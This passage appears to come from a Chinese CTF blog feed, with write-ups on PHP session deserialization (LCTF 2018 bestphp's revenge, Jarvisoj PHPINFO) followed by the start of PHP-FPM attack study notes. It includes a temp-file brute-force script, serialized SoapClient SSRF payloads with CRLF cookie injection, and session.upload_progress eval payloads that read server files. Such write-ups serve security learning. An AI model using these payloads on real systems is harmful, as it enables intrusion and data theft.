&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;wwwwwwwwwwwwww&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;[+] Include success!&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">e&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">brute_force_tmp_files&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>爆破成功后就拿到了shell，其余跟上面一样&lt;/p>
&lt;h3 id="lctf-2018bestphps-revenge">[LCTF 2018]bestphp&amp;rsquo;s revenge&lt;/h3>
&lt;p>————这个栗子结合了SoapClient和session的考点&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;implode&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#d88200">&amp;#39;welcome_to_the_lctf2018&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>看到了我们的老朋友&lt;code>call_user_func&lt;/code>，它会把第一个参数作为回调函数，其余参数作为回调函数的参数；如果我们第一个参数传入的是数组，它会把数组的第一个值作为类名，第二个值当作方法进行回调（反序列化中常见）；&lt;code>call_user_func&lt;/code>函数不仅可以调用自定义函数和类，也可以调用php内置函数和内置类，比如&lt;code>extract&lt;/code>&lt;/p>
&lt;p>flag.php可以直接访问（这里我没有扫 看wp知道的 robots.txt和页面源码都没有直接的提示）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211128225823073.png" alt="image-20211128225823073">&lt;/p>
&lt;p>这个回显很明显需要ssrf，以localhost访问flag.php就会将flag写入SESSION中&lt;/p>
&lt;p>内置类&lt;code>SoapClient()&lt;/code>满足这个需要，它可以通过反序列化来发起一个http请求（需要被调用&lt;code>__call&lt;/code>&lt;/p>
&lt;p>所以整体思路是这样的：&lt;/p>
&lt;ol>
&lt;li>覆盖序列化引擎为&lt;code>php_serialize&lt;/code>， 通过&lt;code>session_start&lt;/code>将一个序列化的&lt;code>SoapClient&lt;/code>写入session；由于get传入的name会被直接放入session中，所以序列化的字符串不用post传，只需要post传设置反序列化引擎的参数就可以&lt;/li>
&lt;li>第一个&lt;code>call_user_func&lt;/code>通过&lt;code>extract&lt;/code>变量覆盖使&lt;code>$b = call_user_func&lt;/code>，第二个&lt;code>call_user_func&lt;/code>调用&lt;code>SoapClient-&amp;gt;__call&lt;/code>（不可访问的方法 call_user_func）&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1/flag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SoapClient&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;location&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;user_agent&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;AAA:BBB&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Cookie:PHPSESSID=gnnorfjmr9hr82gej7njt5dc83&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;uri&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$se&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$se&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">// O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;amp;f=session_start
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
POST: serialize_handler=php_serialize
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/?name=Soapclient&amp;amp;f=extract
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
POST: b=call_user_func
&lt;/code>&lt;/pre>&lt;p>之后刷新页面就可以触发反序列化了，由于上面构造的时候cookie就是当前页面的cookie，所以整一套过程下来不需要单独改session，首页就可以看到结果&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129123843040.png" alt="image-20211129123843040">&lt;/p>
&lt;h3 id="jarvisoj-webphpinfo">[Jarvisoj web]PHPINFO&lt;/h3>
&lt;p>&lt;a href="http://web.jarvisoj.com:32784/index.php">这里是题目页面&lt;/a>；开幕源码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75715e">//A webshell is wait for you
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mdzz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;phpinfo();&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mdzz&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;phpinfo&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先看看phpinfo，应该有提示信息；发现&lt;code>session.upload_progress.enabled=On&lt;/code>，这就非常好了，构造一个上传表单把我们想执行的代码序列化后设为文件名传入&lt;/p>
&lt;p>序列化exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php_serialize&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;print_r(scandir(dirname(__FILE__)));&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$obj&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">// |O:5:&amp;#34;OowoO&amp;#34;:1:{s:4:&amp;#34;mdzz&amp;#34;;s:36:&amp;#34;print_r(scandir(dirname(__FILE__)));&amp;#34;;}
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>构造上传表单，注意文件名的引号要加反斜杠转义&lt;/p>
&lt;pre tabindex="0">&lt;code>|O:5:\&amp;quot;OowoO\&amp;quot;:1:{s:4:\&amp;quot;mdzz\&amp;quot;;s:36:\&amp;quot;print_r(scandir(dirname(__FILE__)));\&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129212625924.png" alt="image-20211129212625924">&lt;/p>
&lt;p>然后访问这个php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;print_r(file_get_contents(&amp;#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&amp;#34;));&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>|O:5:\&amp;quot;OowoO\&amp;quot;:1:{s:4:\&amp;quot;mdzz\&amp;quot;;s:88:\&amp;quot;print_r(file_get_contents(\&amp;quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&amp;quot;));\&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>得到flag&lt;/p>
&lt;hr>
&lt;p>呼……长舒一口气，这个知识点终于画上了一个小句号；暑假总结php反序列化的时候就差整个和内置类，结果磨磨蹭蹭拖到今天，不过还是被我终结掉啦！文中还设计了一点SoapClient内置类的东西，由于篇幅原因不展开讲了= = 、&lt;/p>
&lt;p>最近的计划和安排就是刷题&amp;amp;把之前的知识体系填充完整，加油啦&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://xz.aliyun.com/t/3339#toc-3">LCTF 2018 Writeup &amp;ndash; ROIS&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP中SESSION反序列化机制&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.freebuf.com/news/202819.html">利用session.upload_progress进行文件包含和反序列化渗透&lt;/a>&lt;/p>
&lt;p>如有遗漏请指正！！！&lt;/p>
&lt;/details></description></item><item><title>攻击PHP-FPM学习笔记</title><link>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</link><pubDate>Thu, 18 Nov 2021 00:03:25 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</guid><description>&lt;p>之前做题总是会见到，但并不是很懂实际的原理，有点云里雾里的，好像懂了但又没有完全懂，是时候专门来学一下咯！&lt;/p>
&lt;p>没有什么新鲜的东西，只不过把师傅们已有的文章进行一个整合&amp;amp;重新整理，参考链接放到最后啦w&lt;/p>
&lt;h2 id="前置知识">前置知识&lt;/h2>
&lt;h3 id="cgifastcgi">CGI/FastCGI&lt;/h3>
&lt;p>CGI协议用于处理html这类静态文件之后出现的动态语言的解释器与webserver通信的问题，具体的实现有php-cgi&lt;/p>
&lt;p>CGI的弊端是令webserver每次处理请求时都会fork一个cgi进程，结束后再kill，比较浪费资源，FastCGI协议就解决了这个问题，处理完请求后不会kill而是保留该进程，使它可以一次处理多个请求，这样就不用每次fork了&lt;/p>
&lt;p>而php-fpm就是FastCGI协议的一个具体实现，作为FastCGI进程管理器（运行时有一个主进程和多个包含php解释器的worker进程来执行代码），用于接收webserver的请求&lt;/p>
&lt;p>查看phpinfo，Sever API处一般会有三种样式：&lt;/p>
&lt;ul>
&lt;li>Apache 2.0 Handler&lt;/li>
&lt;li>CGI/FastCGI&lt;/li>
&lt;li>FPM/FastCGI&lt;/li>
&lt;/ul>
&lt;p>第一种把php作为apache的一个模块，相当于apache中的一个.dll或.so；第二种php-cgi.exe是一个独立的进程，web服务器也是独立的apache.exe，web服务器监听到http请求时会去调用php-cgi进程，之间通过cgi协议传递数据；而第三种fastcgi也是一种协议，它做了很多优化且常驻内存 不用每次都调用一下cgi，有辅助功能比如内存管理，垃圾处理由php-fpm来实现&lt;/p>
&lt;h3 id="配置">配置&lt;/h3>
&lt;p>php-fpm通信方式有tcp（本地监听9000端口）和unix socket套接字两种方式，题目中可以见到的都是tcp9000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">apt update
apt install nginx -y
apt install software-properties-common -y
apt install php7.4-fpm -y
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="tcp模式">tcp模式&lt;/h4>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">127.0.0.1:9000&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">server{&lt;/span>
&lt;span style="color:#75af00">...&lt;/span>
&lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;span style="color:#75af00">fastcgi_pass 127.0.0.1:9000;&lt;/span>
&lt;span style="color:#75af00">}&lt;/span>
&lt;span style="color:#75af00">...&lt;/span>
&lt;span style="color:#75af00">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="unix-socket模式">unix socket模式&lt;/h4>
&lt;p>如果启动fpm不做改动，默认为套接字模式&lt;/p>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">/run/php/php7.4-fpm.sock&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">server{&lt;/span>
&lt;span style="color:#75af00">...&lt;/span>
&lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;span style="color:#75af00">fastcgi_pass unix:/run/php/php7.4-fpm.sock;&lt;/span>
&lt;span style="color:#75af00">}&lt;/span>
&lt;span style="color:#75af00">...&lt;/span>
&lt;span style="color:#75af00">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后重启即可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">service nginx start &lt;span style="color:#75715e"># reload&lt;/span>
/etc/init.d/php7.4-fpm start &lt;span style="color:#75715e"># restart&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果出现报错请查看对应日志&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">cat /var/log/nginx/error.log
cat /var/log/php7.4-fpm.log
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="漏洞成因">漏洞成因&lt;/h2>
&lt;p>按FastCGI协议传输的内容分为header和body两部分&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#00a8c8">typedef&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75715e">/* Header */&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">version&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 版本
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 本次record的类型
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 本次record对应的请求id
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// body体的大小
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 额外块大小
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">reserved&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">/* Body */&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">contentLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#111">FCGI_Record&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>先从heder中拿到body体大小（最大2^16=65535字节），再从tcp流里读取大小等于contentLenth的body，之后还有一部分额外的padding&lt;/p>
&lt;p>header中的type起到指定record的作用，因为FastCGI的单个record大小有限作用单一，所以我们需要一个TCP流中传输多个record，通过type来标识每个record的作用是什么，requestId做到区分每一次的请求&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112110643128.png" alt="image-20211112110643128">&lt;/p>
&lt;p>当type=4时，表明消息中包含的数据为某个name-value对，比如&lt;/p>
&lt;pre tabindex="0">&lt;code>{
'GATEWAY_INTERFACE': 'FastCGI/1.0',
'REQUEST_METHOD': 'GET',
'SCRIPT_FILENAME': '/var/www/html/index.php',
'SCRIPT_NAME': '/index.php',
'QUERY_STRING': '?a=1&amp;amp;b=2',
'REQUEST_URI': '/index.php?a=1&amp;amp;b=2',
'DOCUMENT_ROOT': '/var/www/html',
'SERVER_SOFTWARE': 'php/fcgiclient',
'REMOTE_ADDR': '127.0.0.1',
'REMOTE_PORT': '12345',
